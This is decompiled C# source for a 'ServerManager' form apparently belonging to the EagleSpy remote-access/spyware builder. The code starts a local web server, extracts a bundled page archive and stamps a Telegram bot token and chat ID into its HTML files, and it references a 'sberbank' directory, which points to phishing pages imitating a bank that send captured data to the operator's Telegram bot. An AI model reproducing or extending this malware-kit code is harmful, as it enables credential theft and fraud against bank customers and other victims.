using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy;
using Guna.UI2.WinForms;

namespace Eaglespy
{
	// Token: 0x020000F7 RID: 247
	public partial class ServerManager : Form
	{
		// Token: 0x06000C76 RID: 3190 RVA: 0x00117628 File Offset: 0x00115828
		public ServerManager()
		{
			this.httpListener = new HttpListener();
			this.InitializeComponent();
		}

		// Token: 0x06000C77 RID: 3191 RVA: 0x000078A6 File Offset: 0x00005AA6
		public void HideForm()
		{
			if (base.InvokeRequired)
			{
				base.Invoke(new Action(base.Hide));
				return;
			}
			base.Hide();
		}

		// Token: 0x06000C78 RID: 3192 RVA: 0x00117690 File Offset: 0x00115890
		private void DisplayIPv4Address()
		{
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
				string text = null;
				IPAddress[] addressList = hostEntry.AddressList;
				foreach (IPAddress ipaddress in addressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						text = ipaddress.ToString();
						break;
					}
				}
				if (text != null)
				{
					this.label1.Text = text ?? "";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000C79 RID: 3193 RVA: 0x0011770C File Offset: 0x0011590C
		private void HandleRequest(HttpListenerContext context)
		{
			HttpListenerRequest request = context.Request;
			HttpListenerResponse response = context.Response;
			string absolutePath = request.Url.AbsolutePath;
			string text = Path.Combine(this.rootDirectory, absolutePath.TrimStart(new char[] { '/' }).Replace('/', '\\'));
			if (File.Exists(text))
			{
				this.ServeFile(response, text);
				return;
			}
			this.SendNotFoundResponse(response);
		}

		// Token: 0x06000C7A RID: 3194 RVA: 0x00117774 File Offset: 0x00115974
		private void ServeFile(HttpListenerResponse response, string filePath)
		{
			byte[] array;
			using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
			{
				array = new byte[fileStream.Length];
				fileStream.Read(array, 0, array.Length);
			}
			response.ContentType = this.GetContentType(filePath);
			response.ContentLength64 = (long)array.Length;
			response.OutputStream.Write(array, 0, array.Length);
			response.OutputStream.Close();
		}

		// Token: 0x06000C7B RID: 3195 RVA: 0x001177F4 File Offset: 0x001159F4
		private void SendNotFoundResponse(HttpListenerResponse response)
		{
			string text = "<html><body><h1>404 Not Found</h1></body></html>";
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			response.StatusCode = 404;
			response.ContentType = "text/html";
			response.ContentLength64 = (long)bytes.Length;
			response.OutputStream.Write(bytes, 0, bytes.Length);
			response.OutputStream.Close();
		}

		// Token: 0x06000C7C RID: 3196 RVA: 0x00117850 File Offset: 0x00115A50
		private string GetContentType(string filePath)
		{
			string extension = Path.GetExtension(filePath);
			string text = ((extension != null) ? extension.ToLower() : null);
			if (text != null)
			{
				switch (text.Length)
				{
				case 3:
					if (!(text == ".js"))
					{
						goto IL_0108;
					}
					return "application/javascript";
				case 4:
				{
					char c = text[1];
					if (c <= 'g')
					{
						if (c != 'c')
						{
							if (c != 'g')
							{
								goto IL_0108;
							}
							if (!(text == ".gif"))
							{
								goto IL_0108;
							}
							return "image/gif";
						}
						else
						{
							if (!(text == ".css"))
							{
								goto IL_0108;
							}
							return "text/css";
						}
					}
					else if (c != 'j')
					{
						if (c != 'p')
						{
							goto IL_0108;
						}
						if (!(text == ".png"))
						{
							goto IL_0108;
						}
						return "image/png";
					}
					else if (!(text == ".jpg"))
					{
						goto IL_0108;
					}
					break;
				}
				case 5:
				{
					char c = text[1];
					if (c != 'h')
					{
						if (c != 'j')
						{
							goto IL_0108;
						}
						if (!(text == ".jpeg"))
						{
							goto IL_0108;
						}
					}
					else
					{
						if (!(text == ".html"))
						{
							goto IL_0108;
						}
						return "text/html";
					}
					break;
				}
				default:
					goto IL_0108;
				}
				return "image/jpeg";
			}
			IL_0108:
			return "application/octet-stream";
		}

		// Token: 0x06000C7D RID: 3197 RVA: 0x0011796C File Offset: 0x00115B6C
		private async void drakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			try
			{
				Application.AddMessageFilter(new ServerManager.ClickOutsideFormMessageFilter(this));
				this.httpListener.Prefixes.Add("http://" + this.label1.Text + ":8081/");
				this.httpListener.Start();
				this.ServerStatusLabel.Text = "Started";
				this.label2.Text = "http://" + this.label1.Text + ":8081/";
				while (this.httpListener.IsListening)
				{
					HttpListenerContext httpListenerContext = await this.httpListener.GetContextAsync();
					this.HandleRequest(httpListenerContext);
				}
			}
			catch (HttpListenerException)
			{
				this.ServerStatusLabel.Text = "Error";
			}
		}

		// Token: 0x06000C7E RID: 3198 RVA: 0x000078CA File Offset: 0x00005ACA
		private void drakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			this.httpListener.Stop();
			this.ServerStatusLabel.Text = "Stopped";
		}

		// Token: 0x06000C7F RID: 3199 RVA: 0x001179A4 File Offset: 0x00115BA4
		private async void Finalbotchat()
		{
			if (Directory.Exists(this.rootDirectory))
			{
				Directory.Delete(this.rootDirectory, true);
			}
			Directory.CreateDirectory(this.rootDirectory);
			await Task.Run(delegate
			{
				ZipFile.ExtractToDirectory(this.binfilepath, this.rootDirectory);
			});
			this.replacementPairs.Add(new ValueTuple<string, string>("[BOT_TOKEN_ID]", this.guna2TextBox1.Text));
			this.replacementPairs.Add(new ValueTuple<string, string>("[BOT_CHAT_ID]", this.guna2TextBox2.Text));
			this.replacementPairs.Add(new ValueTuple<string, string>("[DEV_NAME]", this.devname.Text));
			this.ReplaceTextInSmaliFiles(this.rootDirectory);
		}

		// Token: 0x06000C80 RID: 3200 RVA: 0x000078E7 File Offset: 0x00005AE7
		private void drakeUIAvatar2_Click(object sender, EventArgs e)
		{
			this.Finalbotchat();
			EagleAlert.ShowSucess("Success");
		}

		// Token: 0x06000C81 RID: 3201 RVA: 0x001179DC File Offset: 0x00115BDC
		private void ReplaceTextInSmaliFiles(string directory)
		{
			string[] files = Directory.GetFiles(directory, "*.html", SearchOption.AllDirectories);
			foreach (string text in files)
			{
				try
				{
					string text2 = File.ReadAllText(text);
					foreach (ValueTuple<string, string> valueTuple in this.replacementPairs)
					{
						text2 = text2.Replace(valueTuple.Item1, valueTuple.Item2);
					}
					File.WriteAllText(text, text2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C82 RID: 3202 RVA: 0x000078F9 File Offset: 0x00005AF9
		private void ServerManager_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
			this.DisplayIPv4Address();
		}

		// Token: 0x06000C83 RID: 3203 RVA: 0x00007907 File Offset: 0x00005B07
		private void UpdateEnglish()
		{
			this.ServerStatusLabel.Text = "Server";
			this.drakeUIButtonIcon1.Text = "Stop";
			this.drakeUIButtonIcon2.Text = "Start";
		}

		// Token: 0x06000C84 RID: 3204 RVA: 0x00007939 File Offset: 0x00005B39
		private void UpdateChinese()
		{
			this.ServerStatusLabel.Text = "服务器";
			this.drakeUIButtonIcon1.Text = "停止";
			this.drakeUIButtonIcon2.Text = "开始";
		}

		// Token: 0x06000C85 RID: 3205 RVA: 0x0000796B File Offset: 0x00005B6B
		private void UpdateRussian()
		{
			this.ServerStatusLabel.Text = "Сервер";
			this.drakeUIButtonIcon1.Text = "Остановить";
			this.drakeUIButtonIcon2.Text = "Старт";
		}

		// Token: 0x06000C86 RID: 3206 RVA: 0x00117A84 File Offset: 0x00115C84
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x04000FC3 RID: 4035
		private string binfilepath = Application.StartupPath + "\\res\\Library\\classes2.bin";

		// Token: 0x04000FC4 RID: 4036
		[TupleElementNames(new string[] { "searchText", "replaceText" })]
		private List<ValueTuple<string, string>> replacementPairs = new List<ValueTuple<string, string>>();

		// Token: 0x04000FC5 RID: 4037
		private readonly HttpListener httpListener;

		// Token: 0x04000FC6 RID: 4038
		private readonly string rootDirectory = "C:\\Programs\\Files";

		// Token: 0x04000FC7 RID: 4039
		private string serverfiles = "C:\\Programs\\Files";

		// Token: 0x04000FC8 RID: 4040
		private string sberbank = "C:\\Programs\\Files\\sberbank\\";

		// Token: 0x020000F8 RID: 248
		public class ClickOutsideFormMessageFilter : IMessageFilter
		{
			// Token: 0x06000C8A RID: 3210 RVA: 0x000079CF File Offset: 0x00005BCF
			public ClickOutsideFormMessageFilter(ServerManager form)
			{
				this.mainForm = form;
			}

			// Token: 0x06000C8B RID: 3211 RVA: 0x0011895C File Offset: 0x00116B5C
			public bool PreFilterMessage(ref Message m)
			{
				if (m.Msg == 513)
				{
					IntPtr intPtr = ServerManager.ClickOutsideFormMessageFilter.WindowFromPoint(Cursor.Position);
					if (intPtr != IntPtr.Zero && intPtr != this.mainForm.Handle && !ServerManager.ClickOutsideFormMessageFilter.IsChild(this.mainForm.Handle, intPtr))
					{
						this.mainForm.HideForm();
					}
				}
				return false;
			}

			// Token: 0x06000C8C RID: 3212
			[DllImport("user32.dll")]
			private static extern IntPtr WindowFromPoint(Point p);

			// Token: 0x06000C8D RID: 3213
			[DllImport("user32.dll")]
			private static extern bool IsChild(IntPtr parent, IntPtr child);

			// Token: 0x04000FD8 RID: 4056
			private readonly ServerManager mainForm;
		}
	}
}
